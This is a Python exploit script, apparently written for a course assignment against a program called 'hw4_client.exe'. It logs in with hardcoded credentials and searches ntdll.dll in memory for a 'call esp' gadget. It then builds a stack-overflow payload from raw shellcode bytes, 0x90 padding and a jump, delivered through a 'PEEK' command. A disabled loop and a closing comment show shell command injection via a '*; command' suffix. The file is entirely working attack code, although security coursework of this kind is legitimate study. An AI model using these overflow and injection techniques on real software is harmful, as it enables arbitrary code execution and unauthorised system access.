import socket
import sys
from sys import argv
import subprocess
from subprocess import PIPE
from time import sleep
import os
import ctypes
import struct
from ctypes import wintypes, windll, POINTER, byref, sizeof, c_char
from ctypes.wintypes import *


class MODULEINFO(ctypes.Structure):
    _fields_ = [
        ("lpBaseOfDll",     wintypes.LPVOID),    # remote pointer
        ("SizeOfImage",     wintypes.DWORD),
        ("EntryPoint",      wintypes.LPVOID),    # remote pointer
    ]


LPMODULEINFO = POINTER(MODULEINFO)


def GetModuleInformation(hProcess, hModule, lpmodinfo=None):
    _GetModuleInformation = windll.psapi.GetModuleInformation
    _GetModuleInformation.argtypes = [HANDLE, HMODULE, LPMODULEINFO, DWORD]
    _GetModuleInformation.restype = bool

    if lpmodinfo is None:
        lpmodinfo = MODULEINFO()
    _GetModuleInformation(hProcess, hModule, byref(
        lpmodinfo), sizeof(lpmodinfo))
    return lpmodinfo


def GetCurrentProcess():
    _GetCurrentProcess = windll.kernel32.GetCurrentProcess
    _GetCurrentProcess.argtypes = []
    _GetCurrentProcess.restype = wintypes.HANDLE
    return _GetCurrentProcess()


def GetMoudleHandle(module):
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    kernel32.GetModuleHandleW.restype = wintypes.HMODULE
    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
    hMod = kernel32.GetModuleHandleW(module)

    return hMod


def GetGadgetAddress(gadget):
    gadget_len = len(gadget)
    curr_proc = GetCurrentProcess()
    module_handle = GetMoudleHandle('ntdll.dll')
    module_info = GetModuleInformation(curr_proc, module_handle)
    module_size = module_info.SizeOfImage
    moudle_bytes = (c_char * module_size).from_address(module_handle)
    for i in range(module_size-gadget_len):
        if (moudle_bytes[i:i+gadget_len] == gadget):
            return module_handle + i


#proc = subprocess.Popen('./hw4_client.exe', stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
proc = subprocess.Popen(["hw4_client.exe"],stdin=subprocess.PIPE)



username = "archer\n"
usernameHex = str.encode(username)
proc.stdin.write(usernameHex)
proc.stdin.flush()
password = "S43U0SE6NZ4S46S5\n"
passwordHex = str.encode(password)
proc.stdin.write(passwordHex)
proc.stdin.flush()


callEspHex = "FFD4" #call esp opcode
callEspHexByteArray = bytearray.fromhex(callEspHex)
callEspAdress = GetGadgetAddress(callEspHexByteArray)
#print (callEspAdress)
callEsp = str(hex(callEspAdress))[2:]
address = ''
#print (address)

shellcode = ""
jmptoshell = "E968FDFFFF"
beginingOFShell =  "C7 45 08 63 61 40 00" +	"8B 45 0C 89 44 24 04 C7 04 24 68 61 40 00 E8 CA 30 00 00"
beginingOFShell +=  "83 c4 10 " 												
beginingOFShell +=	"C7 44 24 10 00 00 00 00 C7 44 24 0C 80 80 40 00"        
																				
beginingOFShell +=	"8D 85 6C DF FF FF 89 44 24 08 8B 45 F0"				 
																				
																				
beginingOFShell +=	"89 44 24 04 8B 45 08 89 04 24 E8 D6 FA FF FF"
beginingOFShell	+=	"83 c4 f0  "											
beginingOFShell	+= "90"* (4172 - 76)


shellcode += beginingOFShell + callEsp + jmptoshell
#print(shellcode)
second_attack = str.encode("PEEK ") + bytearray.fromhex(shellcode) + str.encode("\n")
#proc.stdin.write(second_attack)
	

while False:
	try:
		command = input()
	except EOFError:
		continue
	if command == "exit":
		proc.kill()
		break
	proc.stdin.write(str.encode("PEEK \" *; " +command +"\n"))
	proc.stdin.flush()

#peek "*; echo msg"




